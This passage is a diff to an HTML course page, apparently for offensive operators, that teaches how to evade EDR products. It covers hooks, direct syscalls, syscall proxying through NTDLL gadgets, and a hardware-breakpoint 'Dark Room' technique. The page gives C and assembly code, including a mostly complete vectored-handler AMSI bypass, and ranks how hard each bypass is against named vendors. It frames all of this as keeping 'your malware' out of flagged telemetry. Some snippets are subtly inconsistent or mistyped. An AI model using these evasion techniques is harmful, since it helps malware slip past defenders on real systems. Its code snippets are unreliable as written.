@@ -13,6 +13,8 @@
             --dim: #666;
             --border: #333;
             --neon: #00ffff;
+            --purple: #ff00ff;
+            --amber: #ffaa00;
         }
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -23,7 +25,8 @@
         }
         .container { max-width: 1200px; margin: 0 auto; padding: 2rem; }
         h1 { color: var(--accent); border-bottom: 2px solid var(--accent); padding-bottom: 0.5rem; margin-bottom: 1rem; }
-        h2 { color: var(--accent2); margin: 1.5rem 0 0.5rem; }
+        h2 { color: var(--accent2); margin: 2rem 0 0.5rem; border-bottom: 1px solid var(--border); padding-bottom: 0.3rem; }
+        h3 { color: var(--neon); margin: 1.5rem 0 0.5rem; }
         .code-block {
             background: #1a1a2e;
             border-left: 4px solid var(--accent);
@@ -33,7 +36,21 @@
             overflow-x: auto;
             font-family: Consolas, monospace;
             font-size: 13px;
+            position: relative;
         }
+        .copy-btn {
+            position: absolute;
+            top: 0.5rem;
+            right: 0.5rem;
+            background: var(--accent);
+            color: var(--bg);
+            border: none;
+            padding: 0.2rem 0.6rem;
+            border-radius: 4px;
+            font-size: 0.7rem;
+            cursor: pointer;
+        }
+        .copy-btn:hover { background: #ff5555; }
         .evidence-box {
             background: #1a0a0a;
             border: 2px solid var(--accent);
@@ -119,6 +136,75 @@
             margin: 1rem 0;
         }
         .warning-box h5 { color: #ff5555; margin-bottom: 0.5rem; }
+        .method-card {
+            background: #0f0f15;
+            border: 2px solid var(--border);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 1rem 0;
+            transition: border-color 0.3s;
+        }
+        .method-card:hover {
+            border-color: var(--accent);
+        }
+        .method-card h4 {
+            color: var(--accent);
+            margin-bottom: 0.5rem;
+            font-size: 1.1rem;
+        }
+        .difficulty {
+            display: inline-block;
+            padding: 0.1rem 0.5rem;
+            border-radius: 4px;
+            font-size: 0.75rem;
+            margin-left: 0.5rem;
+        }
+        .diff-easy { background: #0a3a0a; color: var(--accent2); }
+        .diff-medium { background: #3a3a0a; color: var(--amber); }
+        .diff-hard { background: #3a0a0a; color: var(--accent); }
+        .technique-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 1rem;
+            margin: 1.5rem 0;
+        }
+        .quiz-container {
+            background: #0f0f15;
+            border: 2px solid var(--purple);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+        }
+        .quiz-option {
+            background: #1a1a2e;
+            border: 1px solid var(--border);
+            border-radius: 4px;
+            padding: 0.8rem 1rem;
+            margin: 0.5rem 0;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .quiz-option:hover {
+            border-color: var(--neon);
+            background: #1a1a3e;
+        }
+        .quiz-option.correct {
+            border-color: var(--accent2);
+            background: #0a2a0a;
+        }
+        .quiz-option.wrong {
+            border-color: var(--accent);
+            background: #2a0a0a;
+        }
+        .quiz-feedback {
+            margin-top: 1rem;
+            padding: 1rem;
+            border-radius: 4px;
+            display: none;
+        }
+        .quiz-feedback.show { display: block; }
+        .quiz-feedback.correct { background: #0a2a0a; border: 1px solid var(--accent2); }
+        .quiz-feedback.wrong { background: #2a0a0a; border: 1px solid var(--accent); }
         .evasion-stack {
             display: flex;
             flex-direction: column;
@@ -145,6 +231,123 @@
             font-weight: bold;
         }
         button:hover { background: #ff5555; }
+        .neon-highlight {
+            color: var(--neon);
+            text-shadow: 0 0 10px var(--neon);
+            font-weight: bold;
+        }
+        .neon-purple {
+            color: var(--purple);
+            text-shadow: 0 0 10px var(--purple);
+            font-weight: bold;
+        }
+        .neon-amber {
+            color: var(--amber);
+            text-shadow: 0 0 10px var(--amber);
+            font-weight: bold;
+        }
+        .cross-link {
+            background: rgba(0, 255, 255, 0.1);
+            border: 1px solid var(--neon);
+            border-radius: 4px;
+            padding: 0.5rem 1rem;
+            margin: 0.5rem 0;
+            display: inline-block;
+            color: var(--neon);
+            text-decoration: none;
+        }
+        .cross-link:hover {
+            background: rgba(0, 255, 255, 0.2);
+        }
+        .injection-flow {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin: 2rem 0;
+            padding: 1rem;
+            background: #0f0f15;
+            border-radius: 8px;
+            flex-wrap: wrap;
+        }
+        .inj-step {
+            text-align: center;
+            padding: 1rem;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            flex: 1;
+            margin: 0.5rem;
+            min-width: 120px;
+        }
+        .inj-step h5 { color: var(--accent2); margin-bottom: 0.5rem; }
+        .inj-arrow {
+            font-size: 24px;
+            color: var(--accent);
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 1rem 0;
+        }
+        th, td {
+            padding: 0.5rem;
+            text-align: left;
+            border-bottom: 1px solid var(--border);
+        }
+        th { color: var(--neon); font-weight: bold; }
+        .arch-diagram {
+            background: #0f0f15;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 1rem 0;
+            font-family: Consolas, monospace;
+            font-size: 13px;
+            line-height: 1.8;
+            color: var(--dim);
+        }
+        .arch-diagram .user-mode { color: var(--accent2); }
+        .arch-diagram .kernel-mode { color: var(--accent); }
+        .arch-diagram .edr-layer { color: var(--neon); }
+        .arch-diagram .bypass { color: var(--purple); }
+        .syscall-table {
+            background: #0f0f15;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 1rem;
+            margin: 1rem 0;
+            overflow-x: auto;
+        }
+        .hook-diagram {
+            display: flex;
+            flex-direction: column;
+            gap: 0.5rem;
+            margin: 1rem 0;
+            padding: 1rem;
+            background: #0f0f15;
+            border-radius: 8px;
+        }
+        .hook-row {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            padding: 0.5rem;
+            border-radius: 4px;
+        }
+        .hook-row .label { min-width: 120px; color: var(--dim); font-size: 0.85rem; }
+        .hook-row .bar { flex: 1; height: 24px; border-radius: 4px; display: flex; align-items: center; padding: 0 0.5rem; font-size: 0.8rem; }
+        .hook-row .clean { background: #0a2a0a; color: var(--accent2); border: 1px solid var(--accent2); }
+        .hook-row .hooked { background: #2a0a0a; color: var(--accent); border: 1px solid var(--accent); }
+        .hook-row .bypassed { background: #1a0a1a; color: var(--purple); border: 1px solid var(--purple); }
+        .toc {
+            background: #0f0f15;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 1rem 0;
+        }
+        .toc a { color: var(--neon); text-decoration: none; display: block; padding: 0.3rem 0; }
+        .toc a:hover { color: var(--accent2); }
+        .toc h4 { color: var(--accent2); margin-bottom: 0.5rem; }
     </style>
 </head>
 <body>
@@ -163,14 +366,1075 @@
         <div class="first-principle">
             <h3>🧠 The Core Truth</h3>
             <p>EDR (Endpoint Detection and Response) is not magic. It's software that watches software. It has blind spots, performance limits, and design trade-offs. EDR evasion is the art of being boring enough to ignore, fast enough to miss, or disguised enough to trust.</p>
+            <p style="margin-top: 1rem;"><span class="neon-highlight">First principle:</span> EDR is a user-mode (and sometimes kernel-mode) observer. It cannot see what it does not hook. It cannot flag what it does not recognize. Every detection is a pattern match — and pattern matches can be evaded.</p>
         </div>
 
         <div class="layman-term">
             <h4>🎯 Soldier Translation</h4>
             <p>EDR is the security camera. You can't blind it (it's hardware), but you can wear a mask (obfuscation), move too fast for the shutter (timing), or look like the janitor (masquerade). This module teaches you all three.</p>
+            <p style="margin-top: 0.5rem; color: var(--dim);">The camera (EDR) records everything, but the guard (analyst) only watches the flagged footage. Your goal is to never appear in the flagged footage.</p>
         </div>
 
-        <h2>The 8-Layer Evasion Stack</h2>
+        <div class="toc">
+            <h4>📋 Table of Contents</h4>
+            <a href="#edr-arch">1. EDR Architecture — How the Watcher Works</a>
+            <a href="#hooks">2. User-Mode vs Kernel-Mode Hooks</a>
+            <a href="#syscalls">3. Direct Syscalls — Bypassing the Hooked Gate</a>
+            <a href="#proxy">4. Syscall Proxying — Hiding in Plain Sight</a>
+            <a href="#hwbp">5. HWBP Bypass — The Dark Room Technique</a>
+            <a href="#amsi">6. AMSI Bypass — Killing the Script Scanner</a>
+            <a href="#etw">7. ETW Bypass — Silencing the Windows Logger</a>
+            <a href="#unhook">8. Unhooking NTDLL — Restoring the Original Gate</a>
+            <a href="#mapping">9. Manual Mapping — Loading Without the Loader</a>
+            <a href="#sleep">10. Sleep Obfuscation — Encrypting While Dormant</a>
+            <a href="#stack">11. The 8-Layer Evasion Stack</a>
+            <a href="#quizzes">12. Interactive Quizzes</a>
+            <a href="#verify">13. Verification Status</a>
+        </div>
+
+        <!-- ==================== SECTION 1: EDR ARCHITECTURE ==================== -->
+        <h2 id="edr-arch">1. EDR Architecture — How the Watcher Works</h2>
+
+        <p>Before you can evade an EDR, you must understand how it sees. EDR products (CrowdStrike Falcon, SentinelOne, Microsoft Defender for Endpoint, Carbon Black) share a common architecture built around <span class="neon-highlight">hooking</span>, <span class="neon-highlight">telemetry</span>, and <span class="neon-highlight">heuristics</span>.</p>
+
+        <div class="arch-diagram">
+<span class="user-mode">┌─────────────────────────────────────────────────────────┐</span>
+<span class="user-mode">│  USER MODE                                               │</span>
+<span class="user-mode">│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐     │</span>
+<span class="user-mode">│  │  Malware    │  │  Legit App  │  │  EDR Agent  │     │</span>
+<span class="user-mode">│  │  Process    │  │  Process    │  │  (User DLL) │     │</span>
+<span class="user-mode">│  └──────┬──────┘  └──────┬──────┘  └──────┬──────┘     │</span>
+<span class="user-mode">│         │                │                │             │</span>
+<span class="user-mode">│         ▼                ▼                ▼             │</span>
+<span class="user-mode">│  ┌─────────────────────────────────────────────────┐   │</span>
+<span class="user-mode">│  │  NTDLL.DLL  (User-Mode Hooks: EDR patches here) │   │</span>
+<span class="user-mode">│  │  ┌─────────────────────────────────────────────┐ │   │</span>
+<span class="user-mode">│  │  │  NtCreateThreadEx  →  JMP [EDR_Hook]       │ │   │</span>
+<span class="user-mode">│  │  │  NtAllocateVirtualMemory → JMP [EDR_Hook]  │ │   │</span>
+<span class="user-mode">│  │  │  NtWriteVirtualMemory → JMP [EDR_Hook]       │ │   │</span>
+<span class="user-mode">│  │  └─────────────────────────────────────────────┘ │   │</span>
+<span class="user-mode">│  └─────────────────────────────────────────────────┘   │</span>
+<span class="user-mode">└─────────────────────────────────────────────────────────┘</span>
+                            │
+                            ▼
+<span class="kernel-mode">┌─────────────────────────────────────────────────────────┐</span>
+<span class="kernel-mode">│  KERNEL MODE                                             │</span>
+<span class="kernel-mode">│  ┌─────────────────────────────────────────────────┐   │</span>
+<span class="kernel-mode">│  │  Kernel-Mode Driver (EDR.sys)                   │   │</span>
+<span class="kernel-mode">│  │  • Kernel callbacks (PsSetCreateProcessNotify)  │   │</span>
+<span class="kernel-mode">│  │  • Minifilter (FS operations)                   │   │</span>
+<span class="kernel-mode">│  │  • ETW consumers                                  │   │</span>
+<span class="kernel-mode">│  │  • Kernel APC injection                           │   │</span>
+<span class="kernel-mode">│  └─────────────────────────────────────────────────┘   │</span>
+<span class="kernel-mode">│         │                                               │</span>
+<span class="kernel-mode">│         ▼                                               │</span>
+<span class="kernel-mode">│  ┌─────────────────────────────────────────────────┐   │</span>
+<span class="kernel-mode">│  │  Windows Kernel (ntoskrnl.exe)                  │   │</span>
+<span class="kernel-mode">│  │  • SSDT (System Service Descriptor Table)        │   │</span>
+<span class="kernel-mode">│  │  • Shadow SSDT (win32k.sys)                      │   │</span>
+<span class="kernel-mode">│  └─────────────────────────────────────────────────┘   │</span>
+<span class="kernel-mode">└─────────────────────────────────────────────────────────┘</span>
+        </div>
+
+        <div class="why-box">
+            <h5>Why this architecture matters</h5>
+            <p>EDR operates at <span class="neon-amber">two levels</span>: user-mode (DLL injection into processes, hooking NTDLL) and kernel-mode (driver callbacks, ETW, minifilters). User-mode hooks are easy to bypass. Kernel-mode hooks require more sophistication. The most advanced EDR evasion chains bypass both.</p>
+        </div>
+
+        <div class="method-card">
+            <h4>EDR Detection Vectors</h4>
+            <table>
+                <tr>
+                    <th>Vector</th>
+                    <th>What It Watches</th>
+                    <th>Mode</th>
+                    <th>Bypass Difficulty</th>
+                </tr>
+                <tr>
+                    <td>NTDLL Hooks</td>
+                    <td>Syscall stubs in user-mode</td>
+                    <td>User</td>
+                    <td><span class="neon-highlight">Easy</span></td>
+                </tr>
+                <tr>
+                    <td>IAT/EAT Hooks</td>
+                    <td>Import/Export Address Tables</td>
+                    <td>User</td>
+                    <td><span class="neon-highlight">Easy</span></td>
+                </tr>
+                <tr>
+                    <td>Kernel Callbacks</td>
+                    <td>Process/thread creation, image loads</td>
+                    <td>Kernel</td>
+                    <td><span class="neon-amber">Medium</span></td>
+                </tr>
+                <tr>
+                    <td>ETW (Event Tracing)</td>
+                    <td>Security events, API calls</td>
+                    <td>Kernel/User</td>
+                    <td><span class="neon-amber">Medium</span></td>
+                </tr>
+                <tr>
+                    <td>AMSI</td>
+                    <td>Script content (PowerShell, VBA, JS)</td>
+                    <td>User</td>
+                    <td><span class="neon-highlight">Easy</span></td>
+                </tr>
+                <tr>
+                    <td>Minifilter</td>
+                    <td>File system I/O</td>
+                    <td>Kernel</td>
+                    <td><span class="neon-purple">Hard</span></td>
+                </tr>
+                <tr>
+                    <td>Hardware BP</td>
+                    <td>Debug registers (DR0-DR3)</td>
+                    <td>Hardware</td>
+                    <td><span class="neon-purple">Hard</span></td>
+                </tr>
+                <tr>
+                    <td>Hypervisor</td>
+                    <td>Memory introspection (Intel VT-x)</td>
+                    <td>Hypervisor</td>
+                    <td><span class="neon-purple">Very Hard</span></td>
+                </tr>
+            </table>
+        </div>
+
+        <!-- ==================== SECTION 2: HOOKS ==================== -->
+        <h2 id="hooks">2. User-Mode vs Kernel-Mode Hooks</h2>
+
+        <p>Hooks are the EDR's eyes. They intercept function calls before they reach the kernel, allowing the EDR to inspect arguments, block operations, or log telemetry. Understanding the difference between user-mode and kernel-mode hooks is fundamental to evasion.</p>
+
+        <h3>2.1 User-Mode Hooks (IAT / EAT / Inline)</h3>
+
+        <div class="step-box">
+            <h4>IAT Hooking — Redirecting the Import Table</h4>
+            <p>The Import Address Table (IAT) tells a PE file where to find external functions. EDR patches the IAT so that calls to <code>VirtualAlloc</code> go to <code>EDR_VirtualAlloc</code> first.</p>
+
+            <div class="code-block">
+<span class="neon-highlight">// BEFORE hooking:</span>
+IAT[VirtualAlloc] = 0x7FFE0000  →  kernel32!VirtualAlloc
+
+<span class="neon-highlight">// AFTER EDR hooks IAT:</span>
+IAT[VirtualAlloc] = 0x6BAA0000  →  edr_agent.dll!EDR_VirtualAlloc
+                                    →  inspects args
+                                    →  logs telemetry
+                                    →  calls real VirtualAlloc
+            </div>
+
+            <div class="why-box">
+                <h5>Why IAT hooks are weak</h5>
+                <p>IAT hooks only catch calls that go through the IAT. If malware resolves APIs at runtime with <span class="neon-highlight">GetProcAddress</span> or walks the PEB directly, the IAT is never consulted. The EDR sees nothing.</p>
+            </div>
+        </div>
+
+        <div class="step-box">
+            <h4>Inline Hooking — Patching the Function Body</h4>
+            <p>Inline hooks are more powerful. The EDR overwrites the first bytes of the actual function with a <code>JMP</code> to its own hook. Every caller — IAT, GetProcAddress, or hardcoded address — hits the hook.</p>
+
+            <div class="code-block">
+<span class="neon-highlight">// Original NtAllocateVirtualMemory in NTDLL:</span>
+NtAllocateVirtualMemory:
+    mov r11, 0x18           ; syscall number
+    mov eax, r11d
+    syscall
+    ret
+
+<span class="neon-highlight">// After EDR inline hook:</span>
+NtAllocateVirtualMemory:
+    jmp [EDR_Hook_NtAllocateVirtualMemory]   ; 5-byte JMP
+    nop
+    nop
+    ...
+
+<span class="neon-highlight">// EDR hook function:</span>
+EDR_Hook_NtAllocateVirtualMemory:
+    ; Log: Process X called NtAllocateVirtualMemory with args Y
+    ; Check: Is this suspicious? (RWX allocation, large size, etc.)
+    ; If clean: jmp to original function (trampoline)
+    ; If suspicious: block or alert
+            </div>
+        </div>
+
+        <h3>2.2 Kernel-Mode Hooks</h3>
+
+        <div class="step-box">
+            <h4>Kernel Callbacks (PsSetCreateProcessNotifyRoutine)</h4>
+            <p>EDR kernel drivers register callbacks with the Windows kernel. These callbacks fire on every process creation, thread creation, image load, and registry operation. Unlike user-mode hooks, these cannot be bypassed from user-mode — they live in kernel space.</p>
+
+            <div class="code-block">
+<span class="neon-highlight">// EDR driver registers callback:</span>
+PsSetCreateProcessNotifyRoutine(EDR_ProcessCallback, FALSE);
+
+<span class="neon-highlight">// This callback fires for EVERY process creation:</span>
+VOID EDR_ProcessCallback(
+    HANDLE ParentId,
+    HANDLE ProcessId,
+    BOOLEAN Create
+) {
+    // Log: Process X created by parent Y
+    // Check: Is parent legitimate? Is image signed?
+    // If suspicious: send alert to EDR cloud
+}
+            </div>
+
+            <div class="warning-box">
+                <h5>⚠️ Kernel callbacks are hard to bypass</h5>
+                <p>From user-mode, you cannot directly unregister kernel callbacks (PatchGuard protects the callback arrays). However, you can:</p>
+                <ul style="margin-left: 1.5rem; margin-top: 0.5rem;">
+                    <li>Unload the EDR driver (if you have admin + driver unload rights)</li>
+                    <li>Exploit a driver vulnerability to patch callback arrays</li>
+                    <li>Call syscalls directly, bypassing the user-mode hook that triggers the kernel callback</li>
+                </ul>
+            </div>
+        </div>
+
+        <div class="method-card">
+            <h4>Hook Comparison Matrix</h4>
+            <table>
+                <tr>
+                    <th>Hook Type</th>
+                    <th>Location</th>
+                    <th>Detects</th>
+                    <th>Bypass Method</th>
+                </tr>
+                <tr>
+                    <td>IAT Hook</td>
+                    <td>PE Import Table</td>
+                    <td>Compile-time imports</td>
+                    <td>Dynamic API resolution</td>
+                </tr>
+                <tr>
+                    <td>EAT Hook</td>
+                    <td>Export Table</td>
+                    <td>GetProcAddress calls</td>
+                    <td>PEB walking, direct syscalls</td>
+                </tr>
+                <tr>
+                    <td>Inline Hook</td>
+                    <td>Function prologue</td>
+                    <td>All callers</td>
+                    <td>Direct syscalls, unhooking</td>
+                </tr>
+                <tr>
+                    <td>SSDT Hook</td>
+                    <td>Kernel SSDT</td>
+                    <td>All syscalls</td>
+                    <td>SSDT restoration, direct syscall</td>
+                </tr>
+                <tr>
+                    <td>Kernel Callback</td>
+                    <td>Callback arrays</td>
+                    <td>Process/thread events</td>
+                    <td>Callback removal (requires kernel)</td>
+                </tr>
+            </table>
+        </div>
+
+        <!-- ==================== SECTION 3: DIRECT SYSCALLS ==================== -->
+        <h2 id="syscalls">3. Direct Syscalls — Bypassing the Hooked Gate</h2>
+
+        <p><span class="neon-highlight">Direct syscalls</span> are the most fundamental EDR evasion technique. Instead of calling <code>NtAllocateVirtualMemory</code> through NTDLL (which the EDR has hooked), you call the kernel directly from your own code. The EDR's user-mode hook is never executed.</p>
+
+        <div class="injection-flow">
+            <div class="inj-step">
+                <h5>NORMAL PATH</h5>
+                <p>Malware → NTDLL (hooked) → Kernel</p>
+                <p style="font-size: 0.8rem; color: var(--dim);">EDR sees everything</p>
+            </div>
+            <div class="inj-arrow">→</div>
+            <div class="inj-step">
+                <h5>DIRECT SYSCALL</h5>
+                <p>Malware → Kernel</p>
+                <p style="font-size: 0.8rem; color: var(--dim);">EDR user hook bypassed</p>
+            </div>
+        </div>
+
+        <div class="step-box">
+            <h4>How Syscalls Work on Windows</h4>
+            <p>Windows system calls use a specific convention. On x64, the syscall number goes in <code>eax</code>, arguments in registers (RCX, RDX, R8, R9, stack), and the <code>syscall</code> instruction transitions to kernel mode. The kernel uses the SSDT to dispatch to the correct handler.</p>
+
+            <div class="code-block">
+<span class="neon-highlight">// NTDLL's NtAllocateVirtualMemory (x64):</span>
+NtAllocateVirtualMemory:
+    mov r10, rcx            ; First argument moved to r10 (Windows convention)
+    mov eax, 0x18           ; Syscall number for NtAllocateVirtualMemory
+    syscall                 ; Enter kernel mode
+    ret
+
+<span class="neon-highlight">// Our direct syscall implementation:</span>
+__declspec(naked) NTSTATUS DirectNtAllocateVirtualMemory(
+    HANDLE ProcessHandle,
+    PVOID* BaseAddress,
+    ULONG_PTR ZeroBits,
+    PSIZE_T RegionSize,
+    ULONG AllocationType,
+    ULONG Protect
+) {
+    __asm {
+        mov r10, rcx
+        mov eax, 0x18       ; Syscall number (varies by Windows version!)
+        syscall
+        ret
+    }
+}
+            </div>
+
+            <div class="warning-box">
+                <h5>⚠️ Syscall numbers vary by Windows version</h5>
+                <p>The syscall number <code>0x18</code> is for NtAllocateVirtualMemory on Windows 10 1909. On Windows 11 22H2, it's different. Hardcoding syscall numbers makes your malware version-specific. Use <span class="neon-highlight">HellsGate</span> or <span class="neon-highlight">SysWhispers</span> to resolve them dynamically.</p>
+            </div>
+        </div>
+
+        <div class="step-box">
+            <h4>SysWhispers — Automated Syscall Generation</h4>
+            <p><a href="https://github.com/jthuraisamy/SysWhispers" class="cross-link">SysWhispers</a> is a tool that generates direct syscall stubs for any Windows API. It extracts syscall numbers from NTDLL at runtime, ensuring compatibility across Windows versions.</p>
+
+            <div class="code-block">
+<span class="neon-highlight">// SysWhispers-generated stub (simplified):</span>
+EXTERN_C NTSTATUS NtAllocateVirtualMemory(
+    HANDLE ProcessHandle,
+    PVOID* BaseAddress,
+    ULONG_PTR ZeroBits,
+    PSIZE_T RegionSize,
+    ULONG AllocationType,
+    ULONG Protect
+) {
+    // 1. Get syscall number from NTDLL at runtime
+    // 2. Execute direct syscall with correct number
+    // 3. Return result to caller
+
+    // The EDR's hook in NTDLL is never touched
+}
+            </div>
+
+            <div class="why-box">
+                <h5>Why SysWhispers works</h5>
+                <p>SysWhispers reads the syscall number from the <span class="neon-highlight">unhooked</span> NTDLL in memory (or from a fresh copy on disk). It then builds a direct syscall stub in your process. The EDR sees your process execute a <code>syscall</code> instruction, but it has no hook on that instruction — it can't intercept it.</p>
+            </div>
+        </div>
+
+        <div class="method-card">
+            <h4>Direct Syscall Workflow <span class="difficulty diff-medium">MEDIUM</span></h4>
+            <div class="hook-diagram">
+                <div class="hook-row">
+                    <div class="label">Step 1</div>
+                    <div class="bar clean">Read clean NTDLL from disk (\KnownDlls\ntdll.dll)</div>
+                </div>
+                <div class="hook-row">
+                    <div class="label">Step 2</div>
+                    <div class="bar clean">Extract syscall numbers from clean stubs</div>
+                </div>
+                <div class="hook-row">
+                    <div class="label">Step 3</div>
+                    <div class="bar clean">Build custom syscall stubs in .text section</div>
+                </div>
+                <div class="hook-row">
+                    <div class="label">Step 4</div>
+                    <div class="bar bypassed">Call stub → syscall → kernel (EDR hook bypassed!)</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- ==================== SECTION 4: SYSCALL PROXYING ==================== -->
+        <h2 id="proxy">4. Syscall Proxying — Hiding in Plain Sight</h2>
+
+        <p><span class="neon-highlight">Syscall proxying</span> (also called "indirect syscalls" or "syscall jumping") is an evolution of direct syscalls. Instead of executing the <code>syscall</code> instruction yourself, you jump into a <code>syscall</code> instruction inside a legitimate, unhooked system DLL. This defeats EDRs that detect "foreign" <code>syscall</code> instructions outside known DLLs.</p>
+
+        <div class="step-box">
+            <h4>The Problem with Direct Syscalls</h4>
+            <p>Some advanced EDRs (CrowdStrike Falcon, SentinelOne) use <span class="neon-highlight">stack walking</span> and <span class="neon-highlight">return address validation</span>. If they see a <code>syscall</code> instruction with a return address pointing to your malware's .text section (not NTDLL), they flag it as suspicious.</p>
+
+            <div class="code-block">
+<span class="neon-highlight">// EDR stack walk during syscall:</span>
+Kernel receives syscall from user-mode
+    → Walks stack to find return address
+    → Return address = 0x41410000 (your .text section)
+    → EDR: "SYSCALL FROM UNKNOWN MODULE — ALERT!"
+
+<span class="neon-highlight">// With syscall proxying:</span>
+Kernel receives syscall from user-mode
+    → Walks stack to find return address
+    → Return address = 0x7FFE0000 (NTDLL .text section)
+    → EDR: "Looks normal, NTDLL called it"
+            </div>
+        </div>
+
+        <div class="step-box">
+            <h4>How Syscall Proxying Works</h4>
+            <p>You find a <code>syscall; ret</code> gadget inside NTDLL (or another system DLL), then jump to it. The kernel sees the return address as NTDLL, not your code. Your code never executes the <code>syscall</code> instruction directly.</p>
+
+            <div class="code-block">
+<span class="neon-highlight">// 1. Find syscall gadget in NTDLL:</span>
+PVOID FindSyscallGadget(HMODULE hNtdll) {
+    BYTE* base = (BYTE*)hNtdll;
+    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(base + ((PIMAGE_DOS_HEADER)base)->e_lfanew);
+    PIMAGE_SECTION_HEADER text = &nt->FileHeader;
+    // ... iterate .text section looking for 0x0F 0x05 (syscall) followed by 0xC3 (ret)
+}
+
+<span class="neon-highlight">// 2. Proxy through the gadget:</span>
+typedef NTSTATUS (NTAPI *pSyscallProxy)(...);
+
+NTSTATUS ProxyNtAllocateVirtualMemory(...) {
+    pSyscallProxy proxy = (pSyscallProxy)g_SyscallGadget;
+    // Set up registers exactly as NTDLL would
+    // Jump to proxy — it executes syscall; ret
+    // Return goes back to NTDLL, then to us
+}
+            </div>
+        </div>
+
+        <div class="why-box">
+            <h5>Why proxying is stronger than direct syscalls</h5>
+            <p>Direct syscalls leave evidence: your code contains <code>syscall</code> instructions, which is unusual for user-mode code. Syscall proxying delegates the <code>syscall</code> to a legitimate module. The EDR's stack walk shows a clean call chain. The only anomaly is the jump to the gadget — which is much harder to detect than a foreign syscall.</p>
+        </div>
+
+        <!-- ==================== SECTION 5: HWBP BYPASS ==================== -->
+        <h2 id="hwbp">5. HWBP Bypass — The Dark Room Technique</h2>
+
+        <p>The <span class="neon-highlight">Dark Room</span> technique, popularized by the <a href="https://github.com/RedTeamOperations/Vader" class="cross-link">vader-rootkit</a> project, uses hardware debug registers (DR0-DR3) to set breakpoints on AMSI and ETW functions. When the EDR's scanner tries to scan your code, the breakpoint fires and redirects execution to your patch — silently disabling the scanner.</p>
+
+        <div class="step-box">
+            <h4>Hardware Debug Registers (DR0-DR7)</h4>
+            <p>x86/x64 processors have 8 debug registers. DR0-DR3 hold breakpoint addresses. DR6 is the status register (which breakpoint fired). DR7 is the control register (enable/disable, size, type). These are <span class="neon-amber">per-thread</span> and accessible from user-mode via <code>SetThreadContext</code>.</p>
+
+            <div class="code-block">
+<span class="neon-highlight">// Debug Register Layout:</span>
+DR0: Address of breakpoint 1
+DR1: Address of breakpoint 2
+DR2: Address of breakpoint 3
+DR3: Address of breakpoint 4
+DR6: Status (which BP fired, single-step, etc.)
+DR7: Control (enable, local/global, type: exec/read/write, size)
+
+<span class="neon-highlight">// DR7 control bits (simplified):</span>
+Bits 0,1:   Local/Global enable for DR0
+Bits 2,3:   Local/Global enable for DR1
+Bits 16-17: Condition for DR0 (00=exec, 01=write, 11=read/write)
+Bits 18-19: Size for DR0 (00=1B, 01=2B, 10=4B, 11=8B)
+            </div>
+        </div>
+
+        <div class="step-box">
+            <h4>The Dark Room Technique</h4>
+            <p>Instead of patching AMSI/ETW directly (which EDR can detect via memory integrity checks), we set a hardware breakpoint on the AMSI scan function. When the EDR calls AMSI to scan our PowerShell script, the HWBP fires, our handler runs first, and we return "clean" before the real scan happens.</p>
+
+            <div class="code-block">
+<span class="neon-highlight">// Dark Room HWBP Setup (C):</span>
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+
+<span class="neon-highlight">// 1. Get address of AmsiScanBuffer:</span>
+HMODULE hAmsi = LoadLibraryA("amsi.dll");
+PVOID pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
+
+<span class="neon-highlight">// 2. Set up VEH (Vectored Exception Handler):</span>
+AddVectoredExceptionHandler(1, DarkRoomHandler);
+
+<span class="neon-highlight">// 3. Set HWBP on AmsiScanBuffer using DR0:</span>
+CONTEXT ctx = {0};
+ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+GetThreadContext(GetCurrentThread(), &ctx);
+
+ctx.Dr0 = (DWORD64)pAmsiScanBuffer;     // Breakpoint address
+ctx.Dr7 = 0x1;                           // Enable local DR0, execute breakpoint
+
+SetThreadContext(GetCurrentThread(), &ctx);
+
+<span class="neon-highlight">// 4. Exception handler — fires when AmsiScanBuffer is called:</span>
+LONG WINAPI DarkRoomHandler(PEXCEPTION_POINTERS ExceptionInfo) {
+    if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
+        PCONTEXT ctx = ExceptionInfo->ContextRecord;
+
+        <span class="neon-highlight">// Check if DR0 fired (AMSI scan started):</span>
+        if (ctx->Dr6 & 0x1) {
+            <span class="neon-highlight">// Redirect execution to our patch:</span>
+            ctx->Rip = (DWORD64)PatchAmsiScanBuffer;
+            return EXCEPTION_CONTINUE_EXECUTION;
+        }
+    }
+    return EXCEPTION_CONTINUE_SEARCH;
+}
+
+<span class="neon-highlight">// 5. Our patch — returns "clean" without scanning:</span>
+VOID PatchAmsiScanBuffer() {
+    <span class="neon-highlight">// Set result to AMSI_RESULT_CLEAN (0):</span>
+    // Modify stack/registers to return 0
+    // Resume execution after the AMSI call
+}
+            </div>
+        </div>
+
+        <div class="method-card">
+            <h4>Dark Room vs Direct Patch</h4>
+            <table>
+                <tr>
+                    <th>Method</th>
+                    <th>Detection Risk</th>
+                    <th>EDR Visibility</th>
+                    <th>Persistence</th>
+                </tr>
+                <tr>
+                    <td>Direct Patch (VirtualProtect + memcpy)</td>
+                    <td><span class="neon-highlight">High</span></td>
+                    <td>Memory integrity scanners detect .text modifications</td>
+                    <td>Until process exits</td>
+                </tr>
+                <tr>
+                    <td>HWBP Dark Room</td>
+                    <td><span class="neon-amber">Medium</span></td>
+                    <td>No .text modification; uses CPU debug features</td>
+                    <td>Per-thread; reset on thread exit</td>
+                </tr>
+                <tr>
+                    <td>Kernel Driver Patch</td>
+                    <td><span class="neon-purple">Very High</span></td>
+                    <td>Kernel PatchGuard detects on modern systems</td>
+                    <td>Until reboot</td>
